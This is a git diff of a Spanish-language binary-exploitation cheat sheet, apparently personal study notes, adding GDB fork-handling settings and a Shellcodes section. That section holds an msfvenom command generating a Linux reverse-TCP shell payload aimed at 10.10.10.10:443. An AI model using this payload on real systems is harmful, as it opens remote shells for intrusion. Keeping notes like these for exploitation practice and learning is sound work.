@@ -74,5 +74,21 @@ Ropper encuentra los gadgets para programacion "ROP", corre el bianrio una vez p
 [cucuxii@parrot]~$: ropper --search "pop rdi" -f ./binario
 0x5555558cb: pop rdi, ret
 ```
+---------------------------------------------------------------------------
+
+## GDB
+
+- gef
+Evitar que cree un fork -> set-detach-on-fork off     set follow-fork-mode child
+
+
+---------------------------------------------------------------------------
+
+## Shellcodes
+
+ - Msfvenom -> ``` msfvenom -p linux/x86/shell_Reverse_tcp LHOST=10.10.10.10 LPORT=443 -b "\x00\x0a" -f python```
+
+
+
 
 
